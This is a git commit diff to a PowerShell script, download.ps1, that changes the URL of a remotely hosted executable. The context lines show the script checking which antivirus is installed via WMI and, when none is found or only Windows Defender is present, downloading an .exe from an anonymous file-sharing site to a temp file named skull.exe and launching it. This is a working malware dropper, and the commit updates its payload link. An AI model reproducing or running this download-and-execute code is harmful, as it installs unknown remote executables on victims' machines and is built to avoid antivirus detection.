ca9dda0e6052b3645decbb8e3873e1979ab2fe93
43a1723 <hai1723notgay@gmail.com>
2024-08-07 20:48:10 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -71,7 +71,7 @@ $temp = "$temp\skull.exe";
 $av = Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"; 
 if (($av.Count -eq 0) -or ($av.DisplayName -eq "Windows Defender")) { 
     if (-not (Test-Path $temp)) { 
-        Invoke-WebRequest "https://anonsharing.com/file/4f095b99c1c9cec6/scam.exe" -OutFile $temp 
+        Invoke-WebRequest "https://anonsharing.com/file/6588f00960e4d27f/a_(3).exe" -OutFile $temp 
     } 
     Start-Process $temp 
 }
